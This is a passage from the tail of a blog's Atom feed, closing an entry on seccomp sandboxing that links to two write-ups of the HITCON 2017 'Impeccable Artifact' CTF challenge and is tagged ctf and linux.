rel="noopener">https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact</a><br><a href="https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/" target="_blank" rel="noopener">https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="linux" scheme="blog.b3ale.cn/tags/linux/"/>
    
  </entry>
  
</feed>
